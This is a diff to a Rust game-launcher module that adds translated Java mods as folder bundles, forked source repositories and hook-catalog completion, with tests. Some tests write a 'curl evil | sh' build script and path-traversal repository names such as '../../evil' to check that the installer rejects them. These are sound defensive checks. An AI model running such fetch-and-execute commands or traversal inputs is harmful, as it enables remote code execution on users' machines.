@@ -20,6 +20,7 @@ use crate::i18n::{tr, trf};
 use crate::instances::{self, Instance};
 use crate::rust_toolchain::{self, Toolchain};
 use sha2::{Digest, Sha256};
+use std::collections::HashSet;
 use std::fs;
 use std::io::{BufRead, BufReader, Write};
 use std::path::{Path, PathBuf};
@@ -29,7 +30,8 @@ mod crates;
 
 const PREFIX: &str = "native-";
 /// horizon-mixins, for bundles that don't name the revision they were tested with.
-const MIXINS_GIT: &str = "https://github.com/horizon-rust/horizon-mixins";
+/// horizon-mixins' own repository, on GitHub; a bundle may name a fork ([`SOURCE_FILE`]).
+const MIXINS_REPO: &str = "horizon-rust/horizon-mixins";
 pub const MIXINS_REV: &str = "ddd9700b21997c95d95ac6ee5ecafe3830cf622a";
 /// The features of the release's own game (game-build.yml).
 const FEATURES: &str = "horizon-client/mods";
@@ -300,27 +302,47 @@ pub const INSTALLED: &str = "horizon-native-mods";
 
 /// The native mods turned on in the game folder `home`, unpacked into a folder [`build`] takes.
 /// Each `.hnmod` is checked again as the registry checks it (Rust and TOML under
-/// `mixins/<id>/`, plus files under its `data/`, nothing run).
+/// `mixins/<id>/`, plus files under its `data/`, nothing run). A folder with a
+/// `horizon-mixin.toml` (a Java mod translated by [`add_java`]) is taken as it is, with the same
+/// files allowed; on in `horizon-mods.txt` by its manifest's id.
 pub fn installed_mods(home: &Path) -> Result<PathBuf, String> {
     let out = root().join("installed.incoming");
     let _ = fs::remove_dir_all(&out);
     let mut paths: Vec<PathBuf> = fs::read_dir(home.join(INSTALLED))
         .map(|dir| dir.flatten().map(|e| e.path()).collect())
         .unwrap_or_default();
-    paths.retain(|p| p.extension().is_some_and(|e| e == "hnmod"));
+    paths.retain(|p| p.extension().is_some_and(|e| e == "hnmod") || p.join(MANIFEST).is_file());
     paths.sort();
     let mut count = 0;
+    let mut ids = HashSet::new();
     for path in paths {
-        let bundle = horizon_mods::index::native::Bundle::read(&path)
-            .map_err(|e| format!("{}: {e}", path.display()))?;
-        if !crate::browser::java::is_enabled(home, &bundle.manifest.id) {
-            continue;
-        }
-        let dir = out.join(&bundle.manifest.id);
-        for (name, bytes) in &bundle.files {
-            let to = dir.join(name);
-            fs::create_dir_all(to.parent().unwrap_or(&dir)).map_err(|e| e.to_string())?;
-            fs::write(&to, bytes).map_err(|e| format!("{}: {e}", to.display()))?;
+        let id = if path.is_dir() {
+            let id = bundle(&path, None)?.id;
+            if !crate::browser::java::is_enabled(home, &id) {
+                continue;
+            }
+            copy_sources(&path, &out.join(&id))?;
+            id
+        } else {
+            let bundle = horizon_mods::index::native::Bundle::read(&path)
+                .map_err(|e| format!("{}: {e}", path.display()))?;
+            let id = bundle.manifest.id;
+            if !crate::browser::java::is_enabled(home, &id) {
+                continue;
+            }
+            let dir = out.join(&id);
+            for (name, bytes) in &bundle.files {
+                let to = dir.join(name);
+                fs::create_dir_all(to.parent().unwrap_or(&dir)).map_err(|e| e.to_string())?;
+                fs::write(&to, bytes).map_err(|e| format!("{}: {e}", to.display()))?;
+            }
+            id
+        };
+        if !ids.insert(id.clone()) {
+            return Err(format!(
+                "Two native mods in {} are named {id}: remove one.",
+                home.join(INSTALLED).display()
+            ));
         }
         count += 1;
     }
@@ -331,6 +353,115 @@ pub fn installed_mods(home: &Path) -> Result<PathBuf, String> {
         ));
     }
     Ok(out)
+}
+
+/// The files of the mod folder `dir` a build takes, by their paths in it: its sources, manifests
+/// and data, the files a registry bundle may carry (`horizon_mods::index::native::allowed`). Any
+/// other file, or a link, is an error. The translator's content mods (`content/`, `content-<id>/`),
+/// which [`add_java`] moves to `horizon-mods/`, are left out.
+fn sources(dir: &Path) -> Result<Vec<(String, PathBuf)>, String> {
+    let mut out = Vec::new();
+    let mut todo = vec![String::new()];
+    while let Some(rel) = todo.pop() {
+        let at = if rel.is_empty() { dir.to_owned() } else { dir.join(&rel) };
+        let entries = fs::read_dir(&at).map_err(|e| format!("{}: {e}", at.display()))?;
+        for entry in entries.flatten() {
+            let name = entry.file_name().to_string_lossy().into_owned();
+            let path = if rel.is_empty() { name.clone() } else { format!("{rel}/{name}") };
+            let kind = entry.file_type().map_err(|e| e.to_string())?;
+            if kind.is_dir() {
+                if !(rel.is_empty() && (name == "content" || name.starts_with("content-"))) {
+                    todo.push(path);
+                }
+            } else if kind.is_file() && horizon_mods::index::native::allowed(&path) {
+                out.push((path, entry.path()));
+            } else {
+                return Err(format!(
+                    "{}: {path} is not a source a native mod may carry.",
+                    dir.display()
+                ));
+            }
+        }
+    }
+    out.sort();
+    Ok(out)
+}
+
+/// Copies the files of the mod folder `from` a build takes ([`sources`]) into `to`.
+fn copy_sources(from: &Path, to: &Path) -> Result<(), String> {
+    for (name, path) in sources(from)? {
+        let target = to.join(&name);
+        fs::create_dir_all(target.parent().unwrap_or(to)).map_err(|e| e.to_string())?;
+        fs::copy(&path, &target).map_err(|e| format!("{}: {e}", target.display()))?;
+    }
+    Ok(())
+}
+
+/// The translated Java mods installed in the game folder `home` ([`add_java`]): the folders in
+/// [`INSTALLED`] with a `horizon-mixin.toml`.
+pub fn translated(home: &Path) -> Vec<PathBuf> {
+    let mut dirs: Vec<PathBuf> = fs::read_dir(home.join(INSTALLED))
+        .map(|dir| dir.flatten().map(|e| e.path()).collect())
+        .unwrap_or_default();
+    dirs.retain(|p| p.join(MANIFEST).is_file());
+    dirs.sort();
+    dirs
+}
+
+/// A translated mod's id, version and the digest a build of it records ([`source_digest`] of the
+/// copy [`installed_mods`] makes); None when its manifest can't be read.
+pub fn folder_mod(dir: &Path) -> Option<(String, String, Option<String>)> {
+    let found = bundle(dir, None).ok()?;
+    let digest = sources(dir).ok().and_then(|files| {
+        let read: Vec<(String, Vec<u8>)> = files
+            .into_iter()
+            .map(|(name, path)| Some((name, fs::read(path).ok()?)))
+            .collect::<Option<_>>()?;
+        Some(digest(read.iter().map(|(n, b)| (n.as_str(), b.as_slice()))))
+    });
+    Some((found.id, found.version, digest))
+}
+
+/// What [`add_java`] did: the port's outcome, and the mods it turned on.
+pub struct Added {
+    pub outcome: horizon_port_pack::install::Outcome,
+    /// The ids turned on in `horizon-mods.txt`: content mods, then native ones.
+    pub enabled: Vec<String>,
+}
+
+/// Translates Java mods into the game folder `home` (docs/mod-translator.md): a NeoForge mod's
+/// jar, a folder of jars or a modpack (`horizon_port_pack::install`). What they carry (blocks,
+/// items, recipes, worldgen) becomes content mods in `horizon-mods/`, their code native mods in
+/// [`INSTALLED`]; each is turned on, so the next [`build`] of `home`'s instance has them. No Java
+/// code runs.
+pub fn add_java(source: &Path, home: &Path, log: &dyn Fn(String)) -> Result<Added, String> {
+    let options = horizon_port_pack::install::Options::default();
+    let outcome = horizon_port_pack::install::install(source, home, &options, log)?;
+    let mut content: Vec<&PathBuf> = outcome.mods.iter().filter_map(|m| m.path.as_ref()).collect();
+    content.extend(&outcome.bundled);
+    let mut enabled = Vec::new();
+    for dir in content {
+        let id = fs::read_to_string(dir.join(horizon_mods::manifest::MANIFEST))
+            .ok()
+            .and_then(|t| horizon_mods::Manifest::parse(&t).ok())
+            .map(|m| m.id)
+            .or_else(|| dir.file_name().map(|n| n.to_string_lossy().into_owned()));
+        if let Some(id) = id.filter(|id| !enabled.contains(id)) {
+            crate::browser::java::set_enabled(home, &id, true)?;
+            enabled.push(id);
+        }
+    }
+    let mut natives: Vec<&PathBuf> = outcome.mods.iter().filter_map(|m| m.native.as_ref()).collect();
+    natives.sort();
+    natives.dedup();
+    for dir in natives {
+        let id = bundle(dir, None)?.id;
+        if !enabled.contains(&id) {
+            crate::browser::java::set_enabled(home, &id, true)?;
+            enabled.push(id);
+        }
+    }
+    Ok(Added { outcome, enabled })
 }
 
 /// A mixin bundle: a folder with a `horizon-mixin.toml`, and the revisions it pins.
@@ -346,6 +477,30 @@ pub struct Bundle {
     /// The native hook points' version it needs (its `.hnmod`'s `hooks`): then `horizon` is the
     /// revision it was tested on, and it builds on any with these hook points or later ones.
     pub hooks: Option<u32>,
+    /// The GitHub repository (`owner/name`) whose commit `horizon` is, when not Horizon's own: a
+    /// fork with the hook points the mod needs (the mod translator's bundles), from its
+    /// [`SOURCE_FILE`]. The build downloads that repository's source.
+    pub repository: Option<String>,
+    /// The repository of its `mixins` commit, when not horizon-mixins' own (its [`SOURCE_FILE`]).
+    pub mixins_repository: Option<String>,
+}
+
+/// The file beside a bundle's `horizon-mixin.toml` naming the repositories its Horizon and
+/// horizon-mixins commits are in (`horizon_repository`, `mixins_repository`) and its horizon-mixins
+/// commit (`mixins_revision`): horizon-mixins takes no such keys in the manifest. The mod
+/// translator writes it (`horizon_mod_translator::bundle::SOURCE_FILE`).
+pub const SOURCE_FILE: &str = "horizon-source.toml";
+
+/// Whether `text` names a GitHub repository, `owner/name`: what a source download may be asked for.
+fn is_repository(text: &str) -> bool {
+    let ok = |part: &str| {
+        !part.is_empty()
+            && !part.starts_with('.')
+            && part
+                .bytes()
+                .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_' | b'.'))
+    };
+    matches!(text.split_once('/'), Some((owner, name)) if ok(owner) && ok(name))
 }
 
 /// The bundles in `folder`: the folder itself when it is one (a `horizon-mixin.toml`, or an
@@ -418,14 +573,64 @@ fn bundle(dir: &Path, mixins: Option<String>) -> Result<Bundle, String> {
     let need = |name: &str| {
         field("mod", name).ok_or_else(|| format!("{} has no [mod] {name}.", path.display()))
     };
+    // Where its Horizon and horizon-mixins come from, when the bundle says (SOURCE_FILE).
+    let source_path = dir.join(SOURCE_FILE);
+    let source: toml::Table = match fs::read_to_string(&source_path) {
+        Ok(text) => text
+            .parse()
+            .map_err(|e| format!("{}: {e}", source_path.display()))?,
+        Err(_) => toml::Table::new(),
+    };
+    let named = |key: &str| -> Result<Option<String>, String> {
+        match source.get(key).and_then(|v| v.as_str()) {
+            Some(repo) if is_repository(repo) => Ok(Some(repo.to_owned())),
+            Some(repo) => Err(format!(
+                "{}: {key} {repo:?} is not a GitHub repository (owner/name).",
+                source_path.display()
+            )),
+            None => Ok(None),
+        }
+    };
+    let mixins_pin = source
+        .get("mixins_revision")
+        .and_then(|v| v.as_str())
+        .map(str::to_owned);
     Ok(Bundle {
         id: need("id")?,
         version: need("version")?,
         dir: dir.to_owned(),
         horizon: field("compatibility", "horizon_revision"),
-        mixins,
+        mixins: mixins.or(mixins_pin),
         hooks: None,
+        repository: named("horizon_repository")?,
+        mixins_repository: named("mixins_repository")?,
     })
+}
+
+/// The one repository `bundles` name for `which` (each mod's `get`), else `fallback` (the
+/// upstream one); mods naming different ones can't be built together, and the error says which.
+fn repository(
+    bundles: &[Bundle],
+    which: &str,
+    get: impl Fn(&Bundle) -> Option<&String>,
+    fallback: &str,
+) -> Result<String, String> {
+    let mut named: Vec<(&String, &str)> = bundles
+        .iter()
+        .filter_map(|b| get(b).map(|r| (r, b.id.as_str())))
+        .collect();
+    named.sort();
+    match named.first() {
+        None => Ok(fallback.to_owned()),
+        Some((first, _)) if named.iter().all(|(r, _)| r == first) => Ok((*first).clone()),
+        Some(_) => {
+            let list: Vec<String> = named.iter().map(|(r, id)| format!("{id} → {r}")).collect();
+            Err(format!(
+                "These mods need {which} from different repositories and can't be built together: {}.",
+                list.join(", ")
+            ))
+        }
+    }
 }
 
 fn is_revision(text: &str) -> bool {
@@ -579,12 +784,10 @@ fn hooks_in(source: &str) -> Option<u32> {
     line.trim_end().strip_suffix(';')?.parse().ok()
 }
 
-/// The native hook points' version of Horizon at `revision`, from GitHub (None: it has none).
-fn hooks_at(revision: &str) -> Option<u32> {
-    let url = format!(
-        "https://raw.githubusercontent.com/{}/{revision}/{HOOKS_FILE}",
-        backend::REPO
-    );
+/// The native hook points' version of Horizon at `revision` of `repo`, from GitHub (None: it has
+/// none).
+fn hooks_at(repo: &str, revision: &str) -> Option<u32> {
+    let url = format!("https://raw.githubusercontent.com/{repo}/{revision}/{HOOKS_FILE}");
     let text = backend::get(&url).ok()?.into_string().ok()?;
     hooks_in(&text)
 }
@@ -1008,9 +1211,9 @@ fn diagnostic(text: &str) -> Option<String> {
     Some(line)
 }
 
-/// horizon-mixins at commit `rev`, built once with the launcher's cargo (`cargo install --locked`);
-/// `progress` hears [`Step::Tool`] only when it is built.
-fn tool(rust: &Toolchain, rev: &str, progress: &impl Fn(Step)) -> Result<PathBuf, String> {
+/// horizon-mixins at commit `rev` of GitHub's `repo`, built once with the launcher's cargo
+/// (`cargo install --locked`); `progress` hears [`Step::Tool`] only when it is built.
+fn tool(rust: &Toolchain, repo: &str, rev: &str, progress: &impl Fn(Step)) -> Result<PathBuf, String> {
     let dir = root().join("tools").join(&rev[..12]);
     let bin = dir
         .join("bin")
@@ -1019,9 +1222,8 @@ fn tool(rust: &Toolchain, rev: &str, progress: &impl Fn(Step)) -> Result<PathBuf
         progress(Step::Tool);
         let mut cmd = rust.command(&rust.cargo());
         rust_toolchain::low_priority(&mut cmd);
-        cmd.args([
-            "install", "--locked", "--git", MIXINS_GIT, "--rev", rev, "--root",
-        ])
+        let git = format!("https://github.com/{repo}");
+        cmd.args(["install", "--locked", "--git", &git, "--rev", rev, "--root"])
         .arg(&dir)
         .arg("horizon-mixins-cli");
         run(cmd, "Building horizon-mixins", |_| {})?;
@@ -1139,26 +1341,85 @@ fn post_build_programs(
     Ok(out)
 }
 
-/// Horizon's source at commit `revision`: GitHub's archive of it, unpacked once, with the commit in
-/// `.horizon-revision` (bundles pin it). A Nightly's commit stays downloadable after the Nightly
-/// is gone: its `nightly-source/…` tag keeps it (docs/release-flow.md). Links are left out:
-/// horizon-mixins refuses them, and none is needed to build.
-fn source(revision: &str) -> Result<PathBuf, String> {
+/// Horizon's source at commit `revision` of GitHub's `repo` (Horizon's own, or the fork a bundle
+/// names): GitHub's archive of it, unpacked once, with the commit in `.horizon-revision` (bundles
+/// pin it) and its hook catalog completed ([`complete_catalog`]). A Nightly's commit stays
+/// downloadable after the Nightly is gone: its `nightly-source/…` tag keeps it
+/// (docs/release-flow.md). Links are left out: horizon-mixins refuses them, and none is needed to
+/// build.
+fn source(repo: &str, revision: &str) -> Result<PathBuf, String> {
     let dir = root().join("source").join(revision);
     if dir.join(".horizon-revision").is_file() {
         return Ok(dir);
     }
-    let archive = format!(
-        "https://codeload.github.com/{}/tar.gz/{revision}",
-        backend::REPO
-    );
+    let archive = format!("https://codeload.github.com/{repo}/tar.gz/{revision}");
     let partial = root().join("source").join(format!(".{revision}.partial"));
     let top = unpack_archive(&archive, &partial, u64::MAX)?;
+    complete_catalog(&top)?;
     fs::write(top.join(".horizon-revision"), revision).map_err(|e| e.to_string())?;
     let _ = fs::remove_dir_all(&dir);
     fs::rename(&top, &dir).map_err(|e| e.to_string())?;
     let _ = fs::remove_dir_all(&partial);
     Ok(dir)
+}
+
+/// The hook catalog's file at a source's root, and the folder of hook points added since the
+/// last release (one JSON fragment per change), which a release stamps into it
+/// (`tools/stamp_native_hooks.py`).
+const CATALOG: &str = "native-hooks.json";
+const FRAGMENTS: &str = "tools/native-hook-fragments";
+
+/// Adds to `source`'s hook catalog the hook points its pending fragments add, as a release's
+/// stamp does (each at version 1, with the catalog's optional facts about it), so mods built on a
+/// commit between releases (a fork's, a Nightly's) find them. A hook point the catalog has stays as
+/// it is; a source with no fragments is left alone.
+fn complete_catalog(source: &Path) -> Result<(), String> {
+    let mut fragments: Vec<PathBuf> = fs::read_dir(source.join(FRAGMENTS))
+        .map(|dir| dir.flatten().map(|e| e.path()).collect())
+        .unwrap_or_default();
+    fragments.retain(|p| p.extension().is_some_and(|e| e == "json"));
+    if fragments.is_empty() {
+        return Ok(());
+    }
+    fragments.sort();
+    let path = source.join(CATALOG);
+    let read = |path: &Path| -> Result<serde_json::Value, String> {
+        let text = fs::read_to_string(path).map_err(|e| format!("{}: {e}", path.display()))?;
+        serde_json::from_str(&text).map_err(|e| format!("{}: {e}", path.display()))
+    };
+    let mut catalog = read(&path)?;
+    let Some(hooks) = catalog["hooks"].as_array_mut() else {
+        return Err(format!("{} has no hooks.", path.display()));
+    };
+    let mut names: HashSet<String> = hooks
+        .iter()
+        .filter_map(|h| h["name"].as_str().map(str::to_owned))
+        .collect();
+    let before = hooks.len();
+    for fragment in &fragments {
+        let fragment_json = read(fragment)?;
+        for hook in fragment_json["hooks"].as_array().into_iter().flatten() {
+            let (Some(name), Some(target)) = (hook["name"].as_str(), hook["target"].as_str())
+            else {
+                return Err(format!("{}: a hook without a name or target.", fragment.display()));
+            };
+            if !names.insert(name.to_owned()) {
+                continue;
+            }
+            let mut entry = serde_json::json!({ "name": name, "version": 1, "target": target });
+            for fact in ["neoforge", "side", "cancellable"] {
+                if !hook[fact].is_null() {
+                    entry[fact] = hook[fact].clone();
+                }
+            }
+            hooks.push(entry);
+        }
+    }
+    if hooks.len() == before {
+        return Ok(());
+    }
+    let text = serde_json::to_string_pretty(&catalog).map_err(|e| e.to_string())?;
+    fs::write(&path, text + "\n").map_err(|e| format!("{}: {e}", path.display()))
 }
 
 /// GitHub's archive (`.tar.gz`) at `url`, unpacked into the fresh folder `partial`: the archive's
@@ -1249,6 +1510,10 @@ pub fn build(
             ..b
         })
         .collect();
+    // The repositories the source and horizon-mixins come from: the ones the mods name (the mod
+    // translator's fork, whose game has their hook points), else Horizon's and horizon-mixins' own.
+    let repo = repository(&mods, "Horizon", |b| b.repository.as_ref(), backend::REPO)?;
+    let mixins_repo = repository(&mods, "horizon-mixins", |b| b.mixins_repository.as_ref(), MIXINS_REPO)?;
     // A mod naming a hook points' version doesn't pin: it follows the others, else the game.
     let pins: Vec<Bundle> = mods.iter().filter(|b| b.hooks.is_none()).cloned().collect();
     let free = pins.iter().all(|b| b.horizon.is_none());
@@ -1261,10 +1526,10 @@ pub fn build(
             None => revision_of(base),
         },
         None,
-        |r| committed(backend::REPO, r),
+        |r| committed(&repo, r),
     )?;
     let game = || revision_of(origin).ok();
-    let revision = with_hooks(&mods, pinned, free, game, hooks_at)?;
+    let revision = with_hooks(&mods, pinned, free, game, |r| hooks_at(&repo, r))?;
     let other = mismatch(&mods, &revision);
     if let (Some(list), false) = (&other, anyway) {
         return Err(format!("{MISMATCH}{list}."));
@@ -1282,13 +1547,15 @@ pub fn build(
         None => e,
     }
     };
+    // The launcher's own horizon-mixins is a candidate only in its own repository.
+    let own = (mixins_repo == MIXINS_REPO).then_some(MIXINS_REV);
     let mixins = newest(
         &mods,
         "horizon-mixins",
         |b| b.mixins.as_ref(),
         || Ok(MIXINS_REV.into()),
-        Some(MIXINS_REV),
-        |r| committed("horizon-rust/horizon-mixins", r),
+        own,
+        |r| committed(&mixins_repo, r),
     )?;
     let version = version_for(&revision, &mixins, profile, &mods)?;
     let now = Record {
@@ -1305,9 +1572,9 @@ pub fn build(
     if !exists {
         rust_toolchain::linker()?;
         let rust = rust_toolchain::install(|f| progress(Step::Rust(f)))?;
-        let tool = tool(&rust, &mixins, &progress)?;
+        let tool = tool(&rust, &mixins_repo, &mixins, &progress)?;
         progress(Step::Source(revision.clone()));
-        let source = source(&revision)?;
+        let source = source(&repo, &revision)?;
         progress(Step::Mixins);
         // `root()` is already the form horizon-mixins and MinGW take: resolved (no link, which
         // it refuses) and, on Windows, ASCII (which they can't read past), both by build_dir.
@@ -1375,7 +1642,9 @@ pub fn build(
         let about = serde_json::json!({
             "base": origin,
             "horizon": revision,
+            "horizon_repository": repo,
             "horizon_mixins": mixins,
+            "horizon_mixins_repository": mixins_repo,
             "hooks": mods.iter().find_map(|m| m.hooks),
             "rust": rust_toolchain::VERSION,
             "profile": profile.name(),
@@ -1697,6 +1966,129 @@ mod tests {
         );
         pack("veinminer.hnmod", Some(("build.sh", "curl evil | sh")));
         assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
+        fs::remove_file(home.join(INSTALLED).join("veinminer.hnmod")).unwrap();
+
+        // A Java mod translated into the folder (add_java): a folder bundle, its code's crates
+        // with it, its content mod left out (it is in horizon-mods/).
+        let at = home.join(INSTALLED).join("waddles_translated");
+        write_bundle(&at, "waddles_translated", "fn hook() {}");
+        fs::create_dir_all(at.join("code-waddles-0/src")).unwrap();
+        fs::write(at.join("code-waddles-0/Cargo.toml"), "[package]\nname = \"code\"\n").unwrap();
+        fs::write(at.join("code-waddles-0/src/lib.rs"), "pub fn f() {}").unwrap();
+        fs::create_dir_all(at.join("content/assets")).unwrap();
+        fs::write(at.join("content/assets/waddles.png"), b"png").unwrap();
+        assert!(installed_mods(&home).is_err(), "off until turned on");
+        crate::browser::java::set_enabled(&home, "waddles_translated", true).unwrap();
+        let out = installed_mods(&home).unwrap();
+        let found = bundles(&out).unwrap();
+        let ids: Vec<&str> = found.iter().map(|b| b.id.as_str()).collect();
+        assert_eq!(ids, ["waddles_translated"]);
+        let copy = out.join("waddles_translated");
+        assert!(copy.join("code-waddles-0/src/lib.rs").is_file());
+        assert!(!copy.join("content").exists());
+        // Up to date once built: the Mods page reads what a build of it records.
+        assert_eq!(
+            crate::native_status::enabled(&home),
+            [(
+                "waddles_translated".to_string(),
+                "0.1.0".to_string(),
+                source_digest(&found[0])
+            )]
+        );
+        fs::write(at.join("build.sh"), "curl evil | sh").unwrap();
+        assert!(installed_mods(&home).is_err(), "only sources, manifests and data");
+    }
+
+    #[test]
+    fn a_translated_mod_names_the_repositories_it_builds_from() {
+        let d = dir("source-file");
+        write_bundle(&d, "waddles_translated", "fn hook() {}");
+        let found = bundle(&d, None).unwrap();
+        assert_eq!((found.repository, found.mixins_repository), (None, None));
+        // As the mod translator writes it (horizon_mod_translator::bundle::SOURCE_FILE).
+        let mixins = "b".repeat(40);
+        let source = format!(
+            "horizon_repository = \"GUNNA-at/horizon-mod-translator\"\nmixins_repository = \"GUNNA-at/horizon-mixins\"\nmixins_revision = \"{mixins}\"\n"
+        );
+        fs::write(d.join(SOURCE_FILE), source).unwrap();
+        let found = bundle(&d, None).unwrap();
+        assert_eq!(
+            found.repository.as_deref(),
+            Some("GUNNA-at/horizon-mod-translator")
+        );
+        assert_eq!(
+            found.mixins_repository.as_deref(),
+            Some("GUNNA-at/horizon-mixins")
+        );
+        assert_eq!(found.mixins.as_deref(), Some(mixins.as_str()));
+        for bad in ["../../evil", "owner", "owner/name/more", "owner/.hidden", "o w/n"] {
+            fs::write(d.join(SOURCE_FILE), format!("horizon_repository = \"{bad}\"\n")).unwrap();
+            assert!(bundle(&d, None).is_err(), "{bad}");
+        }
+    }
+
+    #[test]
+    fn mods_build_from_the_one_repository_they_name() {
+        let named = |id: &str, repo: Option<&str>| Bundle {
+            id: id.into(),
+            version: "1".into(),
+            dir: PathBuf::new(),
+            horizon: None,
+            mixins: None,
+            hooks: None,
+            repository: repo.map(str::to_owned),
+            mixins_repository: None,
+        };
+        fn get(b: &Bundle) -> Option<&String> {
+            b.repository.as_ref()
+        }
+        let upstream = "horizon-rust/horizon";
+        assert_eq!(
+            repository(&[named("a", None)], "Horizon", get, upstream).unwrap(),
+            upstream
+        );
+        let both = [named("a", None), named("b", Some("fork/horizon"))];
+        assert_eq!(
+            repository(&both, "Horizon", get, upstream).unwrap(),
+            "fork/horizon"
+        );
+        let apart = [named("a", Some("one/horizon")), named("b", Some("two/horizon"))];
+        let error = repository(&apart, "Horizon", get, upstream).unwrap_err();
+        assert!(
+            error.contains("a → one/horizon") && error.contains("b → two/horizon"),
+            "{error}"
+        );
+    }
+
+    #[test]
+    fn a_source_between_releases_gets_its_pending_hook_points() {
+        let d = dir("catalog");
+        let catalog = r#"{"hooks": [{"name": "tick", "version": 2, "target": "game::tick"}]}"#;
+        fs::write(d.join(CATALOG), catalog).unwrap();
+        complete_catalog(&d).unwrap();
+        assert_eq!(fs::read_to_string(d.join(CATALOG)).unwrap(), catalog, "no fragments");
+        fs::create_dir_all(d.join(FRAGMENTS)).unwrap();
+        fs::write(
+            d.join(FRAGMENTS).join("spawning.json"),
+            r#"{"hooks": [{"name": "tick", "target": "elsewhere"}, {"name": "spawn", "target": "game::spawn", "side": "server"}], "rust_summary": "", "doc_summary": ""}"#,
+        )
+        .unwrap();
+        fs::write(
+            d.join(FRAGMENTS).join("actors.json"),
+            r#"{"hooks": [{"name": "act", "target": "game::act", "cancellable": true}], "rust_summary": "", "doc_summary": ""}"#,
+        )
+        .unwrap();
+        complete_catalog(&d).unwrap();
+        let text = fs::read_to_string(d.join(CATALOG)).unwrap();
+        let catalog: serde_json::Value = serde_json::from_str(&text).unwrap();
+        assert_eq!(
+            catalog["hooks"],
+            serde_json::json!([
+                {"name": "tick", "version": 2, "target": "game::tick"},
+                {"name": "act", "version": 1, "target": "game::act", "cancellable": true},
+                {"name": "spawn", "version": 1, "target": "game::spawn", "side": "server"},
+            ])
+        );
     }
 
     #[test]
@@ -1708,6 +2100,8 @@ mod tests {
             horizon: horizon.map(str::to_owned),
             mixins: None,
             hooks: None,
+            repository: None,
+            mixins_repository: None,
         };
         let never = || -> Result<String, String> { panic!("a pin wins") };
         fn get(b: &Bundle) -> Option<&String> {
@@ -1740,6 +2134,8 @@ mod tests {
             horizon: horizon.map(str::to_owned),
             mixins: mixins.map(str::to_owned),
             hooks: None,
+            repository: None,
+            mixins_repository: None,
         };
         let c = "c".repeat(40);
         // a is the oldest commit, then b, then c.
@@ -1843,6 +2239,8 @@ mod tests {
             horizon: Some(horizon.into()),
             mixins: None,
             hooks,
+            repository: None,
+            mixins_repository: None,
         };
         let c = "c".repeat(40);
         // A (the game) has hook points v1, B v2, C none.
@@ -1899,6 +2297,8 @@ mod tests {
             horizon: Some(horizon.into()),
             mixins: None,
             hooks,
+            repository: None,
+            mixins_repository: None,
         };
         let (c, d) = ("c".repeat(40), "d".repeat(40));
         // A (the old build's revision) has hook points v1, B (the installed game) v7.
